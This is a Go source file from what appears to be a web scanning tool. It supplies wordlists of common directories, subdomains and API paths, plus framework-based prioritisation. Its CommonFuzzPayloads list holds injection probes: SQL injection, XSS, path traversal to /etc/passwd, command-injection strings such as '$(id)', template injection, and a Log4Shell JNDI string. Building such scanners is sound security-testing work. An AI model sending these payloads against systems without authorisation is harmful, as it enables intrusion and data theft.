package wordlist

import (
	"context"
	"sort"
	"strings"
	"sync"
)

var (
	globalLoader *ExternalLoader
	loaderOnce   sync.Once
)

func InitLoader(enableSecLists, enableKiterunner bool) {
	loaderOnce.Do(func() {
		globalLoader = NewExternalLoader("", enableSecLists, enableKiterunner)
	})
}

// InitLoaderWithConfig initializes the global loader with an explicit
// configuration (profile, vendored SecLists directory, etc.). The first call
// wins; subsequent calls are ignored, matching InitLoader semantics.
func InitLoaderWithConfig(cfg LoaderConfig) {
	loaderOnce.Do(func() {
		globalLoader = NewExternalLoaderWithConfig(cfg)
	})
}

var CommonDirectories = []string{
	"/",
	"/admin",
	"/api",
	"/api/v1",
	"/api/v2",
	"/admin/login",
	"/app",
	"/assets",
	"/backup",
	"/bin",
	"/blog",
	"/config",
	"/data",
	"/db",
	"/debug",
	"/docs",
	"/downloads",
	"/etc",
	"/files",
	"/home",
	"/images",
	"/include",
	"/index.html",
	"/login",
	"/logs",
	"/old",
	"/private",
	"/public",
	"/secure",
	"/src",
	"/static",
	"/styles",
	"/temp",
	"/test",
	"/tmp",
	"/uploads",
	"/user",
	"/users",
	"/var",
	"/web",
	"/.git",
	"/.env",
	"/.gitignore",
	"/web.config",
	"/robots.txt",
	"/sitemap.xml",
}

var CommonSubdomains = []string{
	"admin",
	"api",
	"app",
	"assets",
	"backup",
	"blog",
	"cdn",
	"cms",
	"dashboard",
	"data",
	"db",
	"dev",
	"docs",
	"download",
	"email",
	"ftp",
	"git",
	"help",
	"home",
	"images",
	"login",
	"mail",
	"media",
	"mobile",
	"old",
	"phpmyadmin",
	"sales",
	"secure",
	"server",
	"shop",
	"staging",
	"static",
	"status",
	"store",
	"support",
	"test",
	"upload",
	"web",
	"www",
	"xml",
}

var CommonAPIEndpoints = []string{
	"/api",
	"/api/",
	"/api/v1",
	"/api/v1/",
	"/api/v2",
	"/api/v2/",
	"/api/users",
	"/api/users/",
	"/api/auth",
	"/api/auth/",
	"/api/login",
	"/api/auth/login",
	"/api/config",
	"/api/health",
	"/api/status",
	"/api/info",
	"/api/about",
	"/api/version",
	"/api/docs",
	"/api/swagger",
	"/api/graphql",
	"/graphql",
	"/rest",
	"/rest/",
	"/rest/api",
	"/api/products",
	"/api/items",
	"/api/data",
	"/api/posts",
	"/api/comments",
	"/api/articles",
	"/api/pages",
	"/api/search",
	"/api/export",
	"/api/import",
	"/api/upload",
	"/api/download",
	"/.well-known",
	"/.well-known/openid-configuration",
}

// CommonFuzzPayloads is a small built-in set of active-fuzzing injection
// payloads used to seed probes when external SecLists/PayloadsAllTheThings
// loading is disabled or unavailable.
var CommonFuzzPayloads = []string{
	"'",
	"\"",
	"`",
	"' OR '1'='1",
	"\" OR \"1\"=\"1",
	"' OR 1=1-- -",
	"1' AND SLEEP(5)-- -",
	"<script>alert(1)</script>",
	"\"><script>alert(1)</script>",
	"<img src=x onerror=alert(1)>",
	"javascript:alert(1)",
	"../../../../etc/passwd",
	"..%2f..%2f..%2fetc%2fpasswd",
	"....//....//....//etc/passwd",
	"; id",
	"| id",
	"$(id)",
	"`id`",
	"${7*7}",
	"{{7*7}}",
	"<%= 7*7 %>",
	"#{7*7}",
	"${jndi:ldap://example.com/a}",
	"%00",
	"%0d%0a",
}

func GetCommonDirectories() []string {
	return append([]string{}, CommonDirectories...)
}

func GetCommonSubdomains() []string {
	return append([]string{}, CommonSubdomains...)
}

func GetCommonAPIEndpoints() []string {
	return append([]string{}, CommonAPIEndpoints...)
}

func GetCommonDirectoriesWithExternal(ctx context.Context) []string {
	if globalLoader == nil {
		return GetCommonDirectories()
	}
	return globalLoader.LoadDirectories(ctx)
}

func GetCommonSubdomainsWithExternal(ctx context.Context) []string {
	if globalLoader == nil {
		return GetCommonSubdomains()
	}
	return globalLoader.LoadSubdomains(ctx)
}

func GetCommonAPIEndpointsWithExternal(ctx context.Context) []string {
	if globalLoader == nil {
		return GetCommonAPIEndpoints()
	}
	return globalLoader.LoadAPIEndpoints(ctx)
}

// GetCommonFuzzPayloads returns the built-in active-fuzzing payload set.
func GetCommonFuzzPayloads() []string {
	return append([]string{}, CommonFuzzPayloads...)
}

// GetFuzzingPayloadsWithExternal returns active-fuzzing injection payloads,
// augmented with SecLists Fuzzing/ and PayloadsAllTheThings payloads when the
// external loader is initialized and enabled.
func GetFuzzingPayloadsWithExternal(ctx context.Context) []string {
	if globalLoader == nil {
		return GetCommonFuzzPayloads()
	}
	return globalLoader.LoadFuzzingPayloads(ctx)
}

var frameworkDirectoryPriorities = map[string][]string{
	"react-spa": {"/dashboard", "/settings", "/profile", "/static", "/assets"},
	"nextjs":    {"/_next/static", "/api", "/api/auth", "/dashboard", "/login"},
	"vue-spa":   {"/dashboard", "/settings", "/profile", "/assets", "/static"},
	"nuxt":      {"/_nuxt", "/api", "/dashboard", "/login"},
	"laravel":   {"/login", "/register", "/storage", "/horizon", "/sanctum/csrf-cookie"},
	"django":    {"/admin", "/accounts/login", "/static", "/api"},
	"rails":     {"/users/sign_in", "/rails/info/routes", "/assets", "/admin"},
	"express":   {"/api", "/auth", "/login", "/health", "/graphql"},
	"aspnet":    {"/Account/Login", "/api", "/swagger", "/health", "/hangfire"},
	"spring":    {"/actuator", "/actuator/health", "/swagger-ui", "/v3/api-docs", "/login"},
	"wordpress": {"/wp-admin", "/wp-login.php", "/wp-content", "/wp-json", "/xmlrpc.php"},
}

var frameworkAPIEndpointPriorities = map[string][]string{
	"react-spa": {"/api", "/api/v1", "/graphql"},
	"nextjs":    {"/api", "/api/auth", "/api/health", "/_next/data"},
	"vue-spa":   {"/api", "/api/v1", "/graphql"},
	"nuxt":      {"/api", "/api/_content/query", "/graphql"},
	"laravel":   {"/api", "/api/user", "/sanctum/csrf-cookie", "/graphql"},
	"django":    {"/api", "/api-auth", "/admin", "/graphql"},
	"rails":     {"/rails/active_storage", "/api", "/users/sign_in", "/graphql"},
	"express":   {"/api", "/api/v1", "/auth/login", "/graphql", "/health"},
	"aspnet":    {"/api", "/swagger", "/swagger/v1/swagger.json", "/graphql"},
	"spring":    {"/actuator", "/actuator/health", "/v3/api-docs", "/swagger-ui", "/graphql"},
	"wordpress": {"/wp-json", "/wp-json/wp/v2", "/xmlrpc.php"},
}

func GetCommonDirectoriesPrioritized(ctx context.Context, frameworkHints []string) []string {
	return prioritizePaths(GetCommonDirectoriesWithExternal(ctx), frameworkHints, frameworkDirectoryPriorities)
}

func GetCommonAPIEndpointsPrioritized(ctx context.Context, frameworkHints []string) []string {
	return prioritizePaths(GetCommonAPIEndpointsWithExternal(ctx), frameworkHints, frameworkAPIEndpointPriorities)
}

func prioritizePaths(paths []string, frameworkHints []string, priorities map[string][]string) []string {
	if len(paths) == 0 {
		return nil
	}
	if len(frameworkHints) == 0 {
		return append([]string{}, paths...)
	}

	normalizedHints := make([]string, 0, len(frameworkHints))
	for _, hint := range frameworkHints {
		hint = strings.ToLower(strings.TrimSpace(hint))
		if hint != "" {
			normalizedHints = append(normalizedHints, hint)
		}
	}
	if len(normalizedHints) == 0 {
		return append([]string{}, paths...)
	}

	weightByPath := make(map[string]int, len(paths))
	for _, hint := range normalizedHints {
		for _, candidate := range priorities[hint] {
			weightByPath[candidate] += 10
		}
	}

	out := append([]string{}, paths...)
	sort.SliceStable(out, func(i, j int) bool {
		left := weightByPath[out[i]]
		right := weightByPath[out[j]]
		if left == right {
			return out[i] < out[j]
		}
		return left > right
	})
	return out
}
